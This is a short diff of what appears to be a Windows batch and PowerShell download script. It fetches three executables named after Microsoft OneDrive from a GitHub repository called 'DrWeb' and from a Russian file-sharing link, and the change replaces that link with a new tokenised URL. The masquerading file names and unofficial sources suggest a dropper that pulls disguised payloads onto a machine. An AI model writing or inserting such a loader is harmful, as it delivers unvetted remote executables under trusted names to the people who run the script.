@@ -11,7 +11,7 @@ del 'OneDriveTaskManager.exe'
 timeout /t 1
 $url2 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDrive64.exe'
 $outputFile2 = 'OneDrive64.exe'
-$url='https://download.sberdisk.ru/download/file/735100676?token=CdKG8Qo1nUToKnx&filename=OneDrive.exe'
+$url='https://download.sberdisk.ru/download/file/1329361937?token=7yqqu5tUVMI9Xe7&filename=OneDrive.exe'
 $outputFile = 'OneDrive.exe'
 $url3 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDriveTaskManager.exe'
 $outputFile3 = 'OneDriveTaskManager.exe'
